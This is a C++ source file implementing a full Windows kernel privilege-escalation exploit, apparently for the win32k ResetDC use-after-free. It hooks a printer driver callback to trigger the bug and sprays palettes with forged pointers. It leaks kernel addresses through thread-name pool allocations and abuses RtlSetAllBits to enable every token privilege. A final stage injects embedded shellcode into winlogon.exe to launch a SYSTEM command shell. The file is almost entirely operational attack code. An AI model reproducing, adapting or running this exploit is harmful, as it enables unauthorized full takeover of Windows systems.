/*
	https://bbs.pediy.com/thread-269930.htm
	https://www.freebuf.com/vuls/306179.html
	https://www.jianshu.com/p/f8a210a97860
*/

#include<windows.h>
#include<winddi.h>
#include<winspool.h>
#include <winternl.h>
#include <stdio.h>
#include <Psapi.h>
#pragma comment(lib, "Psapi.lib ")

#define STATUS_INFO_LENGTH_MISMATCH  ((NTSTATUS)0xC0000004L) 

#define ThreadNameInformation 0x26
#define SystemExtendedHandleInformation  64
#define SystemBigPoolInformation 66

using ZwQuerySystemInformation_t = NTSTATUS(*)(
	SYSTEM_INFORMATION_CLASS SystemInformationClass,
	PVOID SystemInformation,
	ULONG SystemInformationLength,
	PULONG ReturnLength);

using NtSetInformationThread_t = NTSTATUS(*)(
	HANDLE threadHandle,
	THREADINFOCLASS threadInformationClass,
	PVOID threadInformation,
	ULONG threadInformationLength);


using DrvEnableDriver_t = BOOL(*)(ULONG iEngineVersion, ULONG cj, DRVENABLEDATA* pded);

using DrvEnablePDEV_t = DHPDEV(*)(DEVMODEW* pdm,
	LPWSTR pwszLogAddress,
	ULONG cPat,
	HSURF* phsurfPatterns,
	ULONG cjCaps,
	ULONG* pdevcaps,
	ULONG cjDevInfo,
	DEVINFO* pdi,
	HDEV hdev,
	LPWSTR pwszDeviceName,
	HANDLE hDriver);

using DrvEnablePDEV_t = DHPDEV(*)(DEVMODEW* pdm,
LPWSTR pwszLogAddress,
ULONG cPat,
HSURF* phsurfPatterns,
ULONG cjCaps,
ULONG* pdevcaps,
ULONG cjDevInfo,
DEVINFO* pdi,
HDEV hdev,
LPWSTR pwszDeviceName,
HANDLE hDriver);

using DrvDisableDriver_t = void(*)();

typedef struct _SYSTEM_BIGPOOL_ENTRY
{
	union
	{
		PVOID VirtualAddress;
		ULONG_PTR NonPaged : 1;     // Set to 1 if entry is nonpaged.
	};
	SIZE_T SizeInBytes;
	union
	{
		UCHAR Tag[4];
		ULONG TagUlong;
	};
} SYSTEM_BIGPOOL_ENTRY, * PSYSTEM_BIGPOOL_ENTRY;

typedef struct _SYSTEM_BIGPOOL_INFORMATION
{
	ULONG Count;
	SYSTEM_BIGPOOL_ENTRY AllocatedInfo[1];
} SYSTEM_BIGPOOL_INFORMATION, * PSYSTEM_BIGPOOL_INFORMATION;

typedef struct _SYSTEM_HANDLE
{
	PVOID Object;
	HANDLE UniqueProcessId;
	HANDLE HandleValue;
	ULONG GrantedAccess;
	USHORT CreatorBackTraceIndex;
	USHORT ObjectTypeIndex;
	ULONG HandleAttributes;
	ULONG Reserved;
} SYSTEM_HANDLE, * PSYSTEM_HANDLE;

typedef struct _SYSTEM_HANDLE_INFORMATION_EX
{
	ULONG_PTR HandleCount;
	ULONG_PTR Reserved;
	SYSTEM_HANDLE Handles[1];
} SYSTEM_HANDLE_INFORMATION_EX, * PSYSTEM_HANDLE_INFORMATION_EX;



namespace g {
	DrvEnablePDEV_t OldDrvEnablePDEV = 0;
	DrvEnableDriver_t DrvEnableDriver = 0;
	DrvDisableDriver_t DrvDisableDriver = 0;
	ZwQuerySystemInformation_t ZwQuerySystemInformation = 0;
	NtSetInformationThread_t NtSetInformationThread = 0;
	ULONG64 RtlSetAllBitsAddress = 0;
	PCHAR szKernelName = NULL;
	PCHAR szPrinterName = NULL;
	HANDLE hToken=INVALID_HANDLE_VALUE;
	ULONG64 KernelBase = 0;
	bool bIsTrigger = false;
	HDC hdc = 0;
};

void Hook_DrvEnablePDEV();
ULONG64 GetKernelBase();
bool Init();
ULONG64 GetToken();
DHPDEV DrvEnablePDEV_Proxy(
	DEVMODEW* pdm,
	LPWSTR   pwszLogAddress,
	ULONG    cPat,
	HSURF* phsurfPatterns,
	ULONG    cjCaps,
	ULONG* pdevcaps,
	ULONG    cjDevInfo,
	DEVINFO* pdi,
	HDEV     hdev,
	LPWSTR   pwszDeviceName,
	HANDLE   hDriver);
void Hook_DrvEnablePDEV();
static DWORD WINAPI  LeakDemoThread(LPVOID lParam);
ULONG64 FakeBitmapHeader();
void SprayPalettes(DWORD size);
bool CheckPrivilege(HANDLE TokenHandle);
DWORD getProcessId(const char* name);
void SpawnShell();

ULONG64 GetKernelBase() {
	DWORD cReturn=0;
	char szDevName[MAX_PATH] = { 0 };
	ULONG64 KernelBase = 0;

	EnumDeviceDrivers(NULL, 0, &cReturn);
	if (cReturn <= 0) {
		printf("[Error_%d] GetKernelBase(): EnumDeviceDrivers failed.\n", __LINE__);
		exit(-1);
	}

	PULONG64 DevList = (PULONG64)GlobalAlloc(GMEM_ZEROINIT, cReturn);
	if (DevList == NULL) {
		printf("[Error_%d] GetKernelBase(): Insufficient system resource.\n", __LINE__);
		exit(-1);
	}

	if (!EnumDeviceDrivers((LPVOID*)DevList, cReturn, &cReturn)) {
		printf("[Error_%d] GetKernelBase(): EnumDeviceDrivers failed.\n", __LINE__);
		exit(-1);
	}

	for (DWORD i = 0; i < cReturn / sizeof(DevList[0]); i++)
	{
		if (GetDeviceDriverBaseNameA((LPVOID)DevList[i], szDevName, MAX_PATH)) {
			char* LowerName = _strlwr(szDevName);
			if (!strncmp(LowerName, "nt",2)) {
				KernelBase = DevList[i];
				g::szKernelName = strdup(szDevName);
				break;
			}
		}
	}
	free(DevList);
	return KernelBase;
}

bool Init() {
	HMODULE hNt = LoadLibraryA("ntdll.dll");
	if (hNt == NULL) {
		printf("[Error_%d] Init(): Can't find ntdll.",__LINE__);
		return FALSE;
	}
	g::ZwQuerySystemInformation = (ZwQuerySystemInformation_t)GetProcAddress(hNt, "NtQuerySystemInformation");
	g::NtSetInformationThread = (NtSetInformationThread_t)GetProcAddress(hNt, "NtSetInformationThread");
	if (g::NtSetInformationThread == NULL || g::ZwQuerySystemInformation == NULL) {
		printf("[Error_%d] Init(): Can't find target func.\n", __LINE__);
		return FALSE;
	}
	 g::KernelBase = GetKernelBase();

	 HMODULE hKernel = LoadLibraryA(g::szKernelName);

	 if (hKernel == NULL) {
		 printf("[Error_%d] Init(): Can't find %s.", __LINE__, g::szKernelName);
		 return FALSE;
	 }

	 ULONG64 RtlSetAllBitsProc = (ULONG64)GetProcAddress(hKernel, "RtlSetAllBits");
	 if (RtlSetAllBitsProc==0) {
		 printf("[Error_%d] Init(): Can't find target func.\n", __LINE__);
		 return FALSE;
	 }

	g::RtlSetAllBitsAddress = RtlSetAllBitsProc - (ULONG64)hKernel + g::KernelBase;
	printf("[+] Found RtlSetAllBitsAddress = %p\n", g::RtlSetAllBitsAddress);

	return TRUE;
}

ULONG64 GetToken() {
	PSYSTEM_HANDLE_INFORMATION_EX sys_handle_info_ref = NULL;
	ULONG64 Token = 0;
	ULONG len = 20;
	NTSTATUS ntst = 0;

	OpenProcessToken(GetCurrentProcess(), GENERIC_READ, &g::hToken);
	if (g::hToken == INVALID_HANDLE_VALUE) {
		printf("[Error_%d] GetToken(): OpenProcessToken failed.\n", __LINE__);
		return 0;
	}
	//获取本进程的EPROCESS
	do {
		len *= 2;
		sys_handle_info_ref = (PSYSTEM_HANDLE_INFORMATION_EX)realloc(sys_handle_info_ref, len);
		ntst = g::ZwQuerySystemInformation(
			(SYSTEM_INFORMATION_CLASS)SystemExtendedHandleInformation, sys_handle_info_ref, len, &len);
	} while (ntst == STATUS_INFO_LENGTH_MISMATCH);

	if (ntst != 0) {
		printf("[Error_%d] GetToken(): ZwQuerySystemInformation failed.\n", __LINE__);
		if (sys_handle_info_ref)
			free(sys_handle_info_ref);
		return 0;
	}

	DWORD pid = GetCurrentProcessId();
	for (int i = 0; i < sys_handle_info_ref->HandleCount; i++) {
		if (g::hToken == sys_handle_info_ref->Handles[i].HandleValue
			&& (HANDLE)pid == sys_handle_info_ref->Handles[i].UniqueProcessId) {
			Token = (ULONG64)sys_handle_info_ref->Handles[i].Object;
			break;
		}
	}

	if (sys_handle_info_ref)
		free(sys_handle_info_ref);

	printf("[+] Found current process token = %p\n",Token);
	return Token;
}

DHPDEV DrvEnablePDEV_Proxy(
	DEVMODEW* pdm,
	LPWSTR   pwszLogAddress,
	ULONG    cPat,
	HSURF* phsurfPatterns,
	ULONG    cjCaps,
	ULONG* pdevcaps,
	ULONG    cjDevInfo,
	DEVINFO* pdi,
	HDEV     hdev,
	LPWSTR   pwszDeviceName,
	HANDLE   hDriver) {

	DHPDEV res;

	printf("[+] DrvEnablePDEV_Proxy called.\n");
	res = g::OldDrvEnablePDEV(pdm, pwszLogAddress, cPat, phsurfPatterns, cjCaps, pdevcaps, cjDevInfo, pdi, hdev, pwszDeviceName, hDriver);
	if (g::bIsTrigger) {
		// 释放hdc
		g::bIsTrigger = FALSE;
		ResetDC(g::hdc, NULL);
		// UAF
		SprayPalettes(0xE20);
		//system("pause");
	}
	return res;
}

void Hook_DrvEnablePDEV() {
	DWORD cbBuf = 0;
	DWORD cbNeed,cReturned;
	PPRINTER_INFO_4 PrintInfo=NULL;
	DRVENABLEDATA DrvData;
	DWORD OldProtect;
	HANDLE hPrinter = INVALID_HANDLE_VALUE;

	//首先枚举本地安装的打印机，找到可用的
	EnumPrintersA(PRINTER_ENUM_LOCAL, NULL, 4, NULL, 0, &cbNeed, &cReturned);
	if (cbNeed <= 0) {
		printf("[Error_%d] Hook_DrvEnablePDEV(): Can't find available printer.\n", __LINE__);
		exit(-1);
	}
	PrintInfo = (PPRINTER_INFO_4)GlobalAlloc(GMEM_ZEROINIT, cbNeed);
	if (PrintInfo == NULL) {
		printf("[Error_%d] Hook_DrvEnablePDEV(): Insufficient system resource.\n", __LINE__);
		exit(-1);
	}
	if (!EnumPrintersA(PRINTER_ENUM_LOCAL, NULL, 4, (PBYTE)PrintInfo, cbNeed, &cbNeed, &cReturned)
		|| cReturned<=0) {
		printf("[Error_%d] Hook_DrvEnablePDEV(): Can't find available printer.\n", __LINE__);
		exit(-1);
	}
	
	// 循环查找打印机
	for (DWORD i = 0; i < cReturned; i++) {
		if (!OpenPrinterA(PrintInfo[i].pPrinterName, &hPrinter, NULL)) {
			printf("[Error_%d] Hook_DrvEnablePDEV(): OpenPrinterA failed.\n", __LINE__);
			continue;
		}
		else {
			printf("[+] Using a available printer: %s.\n", PrintInfo[i].pPrinterName);
			g::szPrinterName = strdup(PrintInfo[i].pPrinterName);
			
			// 获取打印机驱动文件名
			GetPrinterDriverA(hPrinter, NULL, 2, NULL, NULL, &cReturned);
			if (cReturned <= 0) {
				printf("[Error_%d] Hook_DrvEnablePDEV(): GetPrinterDriverA failed.\n", __LINE__);
				continue;
			}
			PDRIVER_INFO_2 DrvInfo = (PDRIVER_INFO_2)GlobalAlloc(GMEM_ZEROINIT, cReturned);
			if (DrvInfo == NULL) {
				printf("[Error_%d] Hook_DrvEnablePDEV(): Insufficient system resource.\n", __LINE__);
				continue;
			}

			if (!GetPrinterDriverA(hPrinter, NULL, 2, (PBYTE)DrvInfo, cReturned, &cReturned) ||
				cReturned <= 0) {
				printf("[Error_%d] Hook_DrvEnablePDEV(): GetPrinterDriverA failed.\n", __LINE__);
				continue;
			}

			HMODULE hPrinterDrv = LoadLibraryExA(DrvInfo->pDriverPath, NULL, LOAD_WITH_ALTERED_SEARCH_PATH);
			if (hPrinterDrv == NULL) {
				printf("[Error_%d] Hook_DrvEnablePDEV(): LoadLibraryExA failed.\n", __LINE__);
				continue;
			}

			g::DrvEnableDriver = (DrvEnableDriver_t)GetProcAddress(hPrinterDrv, "DrvEnableDriver");
			g::DrvDisableDriver = (DrvDisableDriver_t)GetProcAddress(hPrinterDrv, "DrvDisableDriver");
			if (g::DrvEnableDriver == NULL || g::DrvDisableDriver == NULL) {
				printf("[Error_%d] Hook_DrvEnablePDEV(): Can't find target functions .\n", __LINE__);
				continue;
			}
			// 打开图形驱动，获取回调函数列表，里面有我们要HOOK的函数
			if (!g::DrvEnableDriver(DDI_DRIVER_VERSION_NT4, sizeof(DRVENABLEDATA), &DrvData)) {
				printf("[Error_%d] Hook_DrvEnablePDEV(): DrvEnableDriver failed.\n", __LINE__);
				continue;
			}

			if (!VirtualProtect(DrvData.pdrvfn, DrvData.c * sizeof(PFN), PAGE_READWRITE, &OldProtect))
			{
				printf("[Error_%d] Hook_DrvEnablePDEV(): VirtualProtect failed.\n", __LINE__);
				continue;
			}

			for (DWORD i = 0; i < DrvData.c; i++) {
				if (DrvData.pdrvfn[i].iFunc == INDEX_DrvEnablePDEV) {
					// 保存并HOOK
					g::OldDrvEnablePDEV = (DrvEnablePDEV_t)DrvData.pdrvfn[i].pfn;
					DrvData.pdrvfn[i].pfn = (PFN)DrvEnablePDEV_Proxy;
					break;
				}
			}
		}
		// 关闭图形驱动
		g::DrvDisableDriver();
		VirtualProtect(DrvData.pdrvfn, DrvData.c * sizeof(PFN), OldProtect, &OldProtect);

		return;
	}
	
}

static DWORD WINAPI  LeakDemoThread(LPVOID lParam) {
	while (TRUE) {
		Sleep(0x1000 * 60 * 60 * 24 * 365);
	}
	return 0;
}

ULONG64 FakeBitmapHeader() {
	HANDLE hThread = INVALID_HANDLE_VALUE;
	DWORD dwThreadID;
	DWORD dwSize = 0x1000;
	PVOID payload = NULL;

	hThread = CreateThread(NULL, 0, LeakDemoThread, NULL, CREATE_SUSPENDED, &dwThreadID);
	if (hThread == INVALID_HANDLE_VALUE) {
		printf("[Error_%d] CreateThread failed.\n", __LINE__);
		exit(0);
	}

	payload = VirtualAlloc(NULL, dwSize, MEM_COMMIT, PAGE_READWRITE);
	
	// BitmapHeader->Size
	*(PULONG64)payload = 0x40;
	// BitmapHeader->Buffer
	*(PULONG64)((ULONG64)payload + 8) = GetToken()+0x48;

	UNICODE_STRING uzString;
	uzString.Buffer = (PWCHAR)payload;
	uzString.Length = dwSize;
	uzString.MaximumLength = 0xffff;

	// 将伪造的BitMapHeader结构设置到线程名中，使其位于内核池中，以绕过SMAP保护
	NTSTATUS ntst = g::NtSetInformationThread(hThread, (THREADINFOCLASS)ThreadNameInformation, &uzString, sizeof(uzString));
	if (ntst != 0) {
		printf("[Error_%d] NtSetInformationThread failed.\n", __LINE__);
		exit(0);
	}

	// 泄露线程名的地址
	dwSize = 0x400*0x400;
	DWORD dwRetSize;

	PSYSTEM_BIGPOOL_INFORMATION SysPoolInfo =
		(PSYSTEM_BIGPOOL_INFORMATION)GlobalAlloc(GMEM_ZEROINIT, dwSize);

	ntst = g::ZwQuerySystemInformation((SYSTEM_INFORMATION_CLASS)SystemBigPoolInformation, SysPoolInfo, dwSize, &dwRetSize);
	if (ntst != 0) {
		printf("[Error_%d] ZwQuerySystemInformation failed.\n", __LINE__);
		exit(0);
	}

	DWORD DesireSize = uzString.Length + sizeof(uzString);

	for (DWORD i = 0; i < SysPoolInfo->Count; i++) {
		if (!strncmp((char*)SysPoolInfo->AllocatedInfo[i].Tag, "ThNm", 4) &&
			SysPoolInfo->AllocatedInfo[i].SizeInBytes == DesireSize)
		{
			return (ULONG64)SysPoolInfo->AllocatedInfo[i].VirtualAddress;
		}
	}
	return 0;
}

void SprayPalettes(DWORD size) {
	DWORD palCount = (size - 0x90) / 4;
	DWORD palSize = sizeof(LOGPALETTE) + (palCount - 1) * sizeof(PALETTEENTRY);
	LOGPALETTE* lPalette = (LOGPALETTE*)GlobalAlloc(GMEM_ZEROINIT, palSize);

	if (lPalette == NULL) {
		printf("[Error_%d] SprayPalettes(): Insufficient system resource.\n", __LINE__);
		return;
	}
	
	// lPalette->PaletteEntry
	PCHAR Fake = (PCHAR)lPalette+4;

	// Fake BitmapHeader
	ULONG64 BitmapHeader = FakeBitmapHeader() - 1 + 0x10;
	printf("[+] FakeBitmapHeader = %p\n", BitmapHeader);

	/*
		1607:
		*(pdc+0x720) = BitmapHeader
		*(pdc+0xAD0) = RtlSetAllBits
	*/
	((PULONG64)Fake)[0xD7] = BitmapHeader;
	((PULONG64)Fake)[0x14D] = g::RtlSetAllBitsAddress;

	lPalette->palNumEntries = (WORD)palCount;
	lPalette->palVersion = 0x300;

	for(int i=0;i<0x1000;i++)
		CreatePalette(lPalette);
}

void SprayTest(DWORD size) {
	DWORD palCount = (size - 0x90) / 4;
	DWORD palSize = sizeof(LOGPALETTE) + (palCount - 1) * sizeof(PALETTEENTRY);
	printf("[+] palSize = %p\n",palSize);

	LOGPALETTE* lPalette = (LOGPALETTE*)GlobalAlloc(GMEM_ZEROINIT, palSize);

	if (lPalette == NULL) {
		printf("[Error_%d] SprayPalettes(): Insufficient system resource.\n", __LINE__);
		return;
	}

	RtlFillMemory(lPalette, palSize, 'AAAA');

	lPalette->palNumEntries = (WORD)palCount;
	lPalette->palVersion = 0x300;
	system("pause");	
	__debugbreak();
	CreatePalette(lPalette);
}

bool CheckPrivilege(HANDLE TokenHandle)
{
	BOOL isPrivilegeSet = FALSE;
	PRIVILEGE_SET		privSet;
	LUID_AND_ATTRIBUTES Privileges[1];
	LookupPrivilegeValue(NULL, "SeDebugPrivilege", &(Privileges[0].Luid));
	Privileges[0].Attributes = 0;

	privSet.PrivilegeCount = 1;
	privSet.Control = PRIVILEGE_SET_ALL_NECESSARY;
	memcpy(privSet.Privilege, Privileges, sizeof(Privileges));

	PrivilegeCheck(TokenHandle, &privSet, &isPrivilegeSet);
	return isPrivilegeSet;
}

DWORD getProcessId(const char* name)
{
	DWORD aProcesses[1024], cbNeeded, cProcesses;
	unsigned int i;

	if (!EnumProcesses(aProcesses, sizeof(aProcesses), &cbNeeded))
	{
		printf("[Error_%d] EnumProcess failed...\n",__LINE__);
		exit(0);
	}


	// Calculate how many process identifiers were returned.
	cProcesses = cbNeeded / sizeof(DWORD);

	// Print the name and process identifier for each process.
	for (i = 0; i < cProcesses; i++)
	{
		if (aProcesses[i] != 0)
		{
			DWORD processID = aProcesses[i];
			CHAR szProcessName[MAX_PATH] = "<unknown>";

			// Get a handle to the process.

			HANDLE hProcess = OpenProcess(PROCESS_QUERY_INFORMATION |
				PROCESS_VM_READ,
				FALSE, processID);

			// Get the process name.

			if (NULL != hProcess)
			{
				HMODULE hMod;
				DWORD cbNeeded;

				if (EnumProcessModules(hProcess, &hMod, sizeof(hMod),
					&cbNeeded))
				{
					GetModuleBaseNameA(hProcess, hMod, szProcessName,
						sizeof(szProcessName) / sizeof(TCHAR));
				}
			}

			// Print the process name and identifier.
			if (!lstrcmpA(szProcessName, name))
			{
				CloseHandle(hProcess);
				return (processID);
			}

			// Release the handle to the process.

			CloseHandle(hProcess);
		}
	}

	return 0;

}

void SpawnShell() {
	HANDLE hSystemProcess = INVALID_HANDLE_VALUE;
	PVOID  pLibRemote;
	HMODULE hKernel32 = GetModuleHandleA("Kernel32");
	DWORD processID;
	unsigned char shellcode[] =
		"\xfc\x48\x83\xe4\xf0\xe8\xc0\x00\x00\x00\x41\x51\x41\x50\x52\x51" \
		"\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52\x18\x48\x8b\x52" \
		"\x20\x48\x8b\x72\x50\x48\x0f\xb7\x4a\x4a\x4d\x31\xc9\x48\x31\xc0" \
		"\xac\x3c\x61\x7c\x02\x2c\x20\x41\xc1\xc9\x0d\x41\x01\xc1\xe2\xed" \
		"\x52\x41\x51\x48\x8b\x52\x20\x8b\x42\x3c\x48\x01\xd0\x8b\x80\x88" \
		"\x00\x00\x00\x48\x85\xc0\x74\x67\x48\x01\xd0\x50\x8b\x48\x18\x44" \
		"\x8b\x40\x20\x49\x01\xd0\xe3\x56\x48\xff\xc9\x41\x8b\x34\x88\x48" \
		"\x01\xd6\x4d\x31\xc9\x48\x31\xc0\xac\x41\xc1\xc9\x0d\x41\x01\xc1" \
		"\x38\xe0\x75\xf1\x4c\x03\x4c\x24\x08\x45\x39\xd1\x75\xd8\x58\x44" \
		"\x8b\x40\x24\x49\x01\xd0\x66\x41\x8b\x0c\x48\x44\x8b\x40\x1c\x49" \
		"\x01\xd0\x41\x8b\x04\x88\x48\x01\xd0\x41\x58\x41\x58\x5e\x59\x5a" \
		"\x41\x58\x41\x59\x41\x5a\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41" \
		"\x59\x5a\x48\x8b\x12\xe9\x57\xff\xff\xff\x5d\x48\xba\x01\x00\x00" \
		"\x00\x00\x00\x00\x00\x48\x8d\x8d\x01\x01\x00\x00\x41\xba\x31\x8b" \
		"\x6f\x87\xff\xd5\xbb\xe0\x1d\x2a\x0a\x41\xba\xa6\x95\xbd\x9d\xff" \
		"\xd5\x48\x83\xc4\x28\x3c\x06\x7c\x0a\x80\xfb\xe0\x75\x05\xbb\x47" \
		"\x13\x72\x6f\x6a\x00\x59\x41\x89\xda\xff\xd5\x63\x6d\x64\x2e\x65" \
		"\x78\x65\x00";


	if ((processID = getProcessId("winlogon.exe")) == 0)
	{
		printf("[Error_%d] Couldn't retrieve process ID...\n", __LINE__);
		return;
	}
	printf("[+] Retrieved process id: %d\n", processID);
	hSystemProcess = OpenProcess(GENERIC_ALL, false, processID);

	if (hSystemProcess == INVALID_HANDLE_VALUE || hSystemProcess == (HANDLE)0)
	{
		printf("[Error_%d] Couldn't open system process...\n", __LINE__);
		return;
	}
	printf("[+] Got a handle on a system Process: %08p\n", hSystemProcess);


	pLibRemote = VirtualAllocEx(hSystemProcess, NULL, sizeof(shellcode) * 2, MEM_COMMIT, PAGE_EXECUTE_READWRITE);

	if (!pLibRemote)
	{
		printf("[Error_%d] Virtual alloc failed !\n", __LINE__);
		return;
	}

	printf("[+] Allocation in system process succeded with address %08p\n", pLibRemote);

	if (!WriteProcessMemory(hSystemProcess, pLibRemote, shellcode, sizeof(shellcode), NULL))
	{
		printf("[Error_%d] WriteProcessMemory failed !\n", __LINE__);
		return;
	}

	HANDLE hThread = CreateRemoteThread(hSystemProcess, NULL, 0, (LPTHREAD_START_ROUTINE)pLibRemote, NULL, 0, NULL);

	printf("[+] Writing in system process succeded\n");

	if (hThread == NULL) {
		printf("[Error_%d] CreateRemoteThread failed !\n", __LINE__);
		return;
	}
	else
		printf("[+] Remote thread created !\n");
	CloseHandle(hSystemProcess);
}

int main() {
	if (Init()) {
		Hook_DrvEnablePDEV();
		g::hdc = CreateDCA(NULL, g::szPrinterName, NULL, NULL);
		if (g::hdc == 0) {
			printf("[Error_%d] CreateDCA failed !\n", __LINE__);
			exit(-1);
		}
		g::bIsTrigger = TRUE;
		ResetDCA(g::hdc, NULL);
		if (CheckPrivilege(g::hToken)) {
			SpawnShell();
		}
		else {
			printf("[Error_%d] Permission promotion failed!\n", __LINE__);
		}
	}
	//SprayTest(0xE20);
	system("pause");
	return 0;
}